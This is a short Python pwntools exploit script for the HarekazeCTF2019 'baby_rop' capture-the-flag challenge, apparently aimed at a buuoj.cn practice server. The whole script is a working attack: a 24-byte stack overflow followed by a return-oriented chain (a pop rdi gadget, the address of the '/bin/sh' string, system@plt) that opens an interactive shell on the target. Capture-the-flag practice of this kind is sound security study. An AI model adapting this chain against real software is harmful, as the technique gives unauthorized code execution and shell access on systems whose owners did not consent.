from pwn import *


def baby_rop(file_name=r'/mnt/hgfs/CyberSecurity/PWN/buuoj/[HarekazeCTF2019]baby_rop'):
    context(log_level='debug', arch='amd64', os='linux')
    target = process([file_name])
    target = remote('node5.buuoj.cn', 29107)
    target_elf = ELF(file_name)

    system_plt = p64(target_elf.plt['system'])
    bin_sh_str = p64(next(target_elf.search(b'/bin/sh')))

    pop_ret_gadget = p64(0x400683)  # pop rdi ; ret

    payload = b'A' * 24
    # system(/bin/sh)
    payload += pop_ret_gadget + bin_sh_str + system_plt

    target.sendline(payload)

    target.interactive()


if __name__ == '__main__':
    baby_rop()
